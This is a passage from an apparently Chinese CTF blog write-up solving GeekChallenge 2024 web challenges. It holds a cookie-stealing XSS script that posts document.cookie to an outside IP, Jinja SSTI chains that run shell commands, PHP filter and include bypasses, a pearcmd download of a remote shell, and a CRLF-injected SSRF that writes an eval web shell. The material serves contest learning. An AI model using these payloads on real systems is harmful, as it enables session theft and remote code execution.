url=]</span><br></pre></td></tr></table></figure><p>使用POST传参,随意一个url,提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your host must be 127.0.0.1 and can be visit</span><br></pre></td></tr></table></figure><p>传参<code>url=http://127.0.0.1</code><br>提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I have checked your url</span><br></pre></td></tr></table></figure><p>猜测可能会浏览和我们同样的表白墙，加之上方提示cookie中有gift,确认是XSS<br>构造劫持cookie的js:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">on_on_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://120.76.159.54:3389&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = on_on_load;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>提交后获得cookie,成功找到flag</p><h3 id="100-的⚪"><a href="#100-的⚪" class="headerlink" title="100%的⚪"></a>100%的⚪</h3><p>flag写js里了，属于签到题<br><img src="/2025/03/07/geek2024/1IITXLBMWMON72D.png" alt="alt text"><br>base64解码得到flag</p><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><p>php绕过，题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个<code>start</code>参数传递一个数组绕过<br>看一下<code>md5(&quot;Geekchallenge2024_bmKtL&quot;)</code>的值，为<code>0e</code>开头,且判断为弱判断<br>传参:<code>_[2024.geekchallenge.ctf=aaroZmOk</code>绕过<br>最后一个<code>year</code>是强制类型转换，传参<code>1e9</code>成功绕过</p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><p>文件上传<br><img src="/2025/03/07/geek2024/S6ZCG8TUVLB~M4N66RYCY%602.png" alt="alt text"><br>提示是黑名单绕过,那就一个一个尝试<br>发现<code>.jpg.php</code>双写成功绕过，使用蚁剑上马</p><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h3><p>题目总览如下:<br>Please pass these levels,Starven will give you flag!<br>Level1: please use get parameter welcome<br>Level2 please user two post params username &amp; password<br>Level3 you must from <a href="https://www.sycsec.com/">https://www.sycsec.com</a><br>Level4 you must from local ip<br>Level5 you must let Starven give you flag<br><code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php\r<br></span><span style="color: #007700">if&nbsp;(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">"HTTP_STARVEN"</span><span style="color: #007700">]&nbsp;==&nbsp;</span><span style="color: #DD0000">"I_Want_Flag"</span><span style="color: #007700">)&nbsp;&#123;\r<br>&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"........"</span><span style="color: #007700">;\r<br>&#125;\r<br></span>\n</span>\n</code>haha! Thers is last level,please view your cookie and get flag!<br>where is key?<br>give your cookie : token &#x3D; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3Mjk4NjQzNDQsIm5iZiI6MTcyOTg2NDM0NCwiZXhwIjoxNzI5ODcxNTQ0LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6ZmFsc2V9.HD4hxKoLUf7lhML184qng96EZiTlMTTtgAD8mvyDLCk<br><!--key is "Starven_secret_key"--><br></p><p>最后python代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://80-c245227a-02f4-44c0-82e8-7da81ef7f405.challenge.ctfplus.cn/?welcome=geekchallenge2024&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.sycsec.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Real-Ip&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;STARVEN&#x27;</span>:<span class="string">&#x27;I_Want_Flag&#x27;</span>,</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;Starven&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;qwert123456&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3Mjk4NjIyNTcsIm5iZiI6MTcyOTg2MjI1NywiZXhwIjoxNzI5ODY5NDU3LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.1vbIIz51Roat6PffQNLLraYywbeWqemHz3_uhvkGWvA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,headers=headers,data=data,cookies=cookie)</span><br></pre></td></tr></table></figure><p>本题需要注意的点:</p><ul><li>伪造ip除了可以用<code>x-forwarded-for</code>还可以用<code>X-Real-Ip</code></li><li>jwt解密token后为<code>python &#123; &quot;iss&quot;: &quot;Starven&quot;, &quot;aud&quot;: &quot;Ctfer&quot;, &quot;iat&quot;: 1729862257, &quot;nbf&quot;: 1729862257, &quot;exp&quot;: 1729869457, &quot;username&quot;: &quot;Starven&quot;, &quot;password&quot;: &quot;qwert123456&quot;, &quot;hasFlag&quot;: false &#125;</code><br>将hasFlag改成true后使用Starven_secret_key加密回去即可获得flag</li></ul><h3 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h3><p>发现有ssti<br>首先查找过滤字符，<br>发现:<br>过滤:<code>[]、+、request、关键字、:、set、get</code><br>不过滤:<code>&quot;&quot;、__、.、attr、reverse</code><br>既然<code>attr</code>可以用我们就使用<code>reverse</code>进行组合:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse))%&#125;</span><br></pre></td></tr></table></figure><p>成功找到subclasses,虽然python环境未知，但大多在130附近，我们先取132，再根据得到的对象一个一个数找附近wrap_close<br>最后找到是140<br>构造可执行系统命令的语句:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)())%&#125;</span><br></pre></td></tr></table></figure><p>发现flag、\、等字符被ban，用十六进制替换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;cat \x2f\x66\x6c\x61\x67&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)())%&#125;</span><br></pre></td></tr></table></figure><p>最后发现还过滤了flag的回显，直接用env就行,再进行一次reverse:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;env&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)()|reverse)%&#125;</span><br></pre></td></tr></table></figure><p>再使用python倒转flag:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;e3444c55cb6a-a919-3c94-583e-9ea58050&#123;CYS&#x27;</span>[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>成功解出</p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h3><p>查看网站源码发现登录界面:L000G1n.php</p><p>提示用户名4~16位，猜测为<code>admin</code><br>提示密码3位+@chengxing,爆破得<code>SYC@chengxing</code><br>成功进入后台</p><p>发现广告界面可以修改广告的php<br>过滤了很多危险函数,但使用的并不是disable_functions<br>直接拼接即可绕过:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;sys&quot;</span>.<span class="string">&quot;tem&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&quot;env&quot;</span>);</span><br></pre></td></tr></table></figure><p>获得flag:<code>SYC&#123;289537ce-182e-4096-93fe-aeb80e53b094&#125;</code></p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还想非预期?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个绕过require_once包含限制的题<br>详见<a href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></pre></td></tr></table></figure><p>成功进入第二步&#x2F;levelllll2.php:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hint都给的这么明显了还不会做?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到register_argc_argv &#x3D; On,可能是pear文件包含漏洞<br>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps地址:vps端口/1.php</span><br></pre></td></tr></table></figure><p>成功getshell</p><h3 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h3><p>题目是ssrf,但是题目首页什么都没有<br>使用dirsearch扫描目录发现<code>www.zip</code>泄露<br>发现网页源码:</p><ul><li>h4d333333.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="string">&quot;stranger&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$location</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line">    <span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$location</span>,</span><br><span class="line">        <span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hahaha&quot;</span>,</span><br><span class="line">        <span class="string">&quot;login&quot;</span>=&gt;<span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>=&gt;<span class="string">&quot;gueeeeest!!!!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="variable">$user</span>.<span class="string">&quot;&#x27;s Chrome&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">calculator</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please give me a location&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>calculator.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$admin</span>=<span class="string">&quot;aaaaaaaaaaaadmin&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span>=<span class="string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$auth</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$admin</span>,<span class="variable">$adminpass</span>;</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Basic &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="variable">$admin</span> &amp;&amp; <span class="variable">$password</span>===<span class="variable">$adminpass</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$expression</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expression&#x27;</span>];</span><br><span class="line"><span class="variable">$auth</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$auth</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check</span>(<span class="variable">$auth</span>)===<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="variable">$expression</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invalid expression&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>发现可以进行请求头注入<br>需要:</li><li><code>AUTHORIZATION</code>,<code>type</code>为<code>basic</code>,值为base64加密的<code>$admin:$adminpass</code></li><li><code>POST</code>参数<code>expression</code>,值为注入的php代码</li></ul><p>最终payload为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/h4d333333.php?location=http://127.0.0.1/calculator.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=aaa%0D%0AAuthorization%3ABasic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A80%0D%0A%0D%0Aexpression%3Dfile_put_contents%28%27shell.php%27%2C%27%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%27%29%3B%26aaa%3Daaaa</span><br></pre></td></tr></table></figure><h1 id="PHP不比Java差"><a href="#PHP不比Java差" class="headerlink" title="PHP不比Java差"></a>PHP不比Java差</h1><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="variable">$_GET</span>[<span class="string">&quot;change&quot;</span>];</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 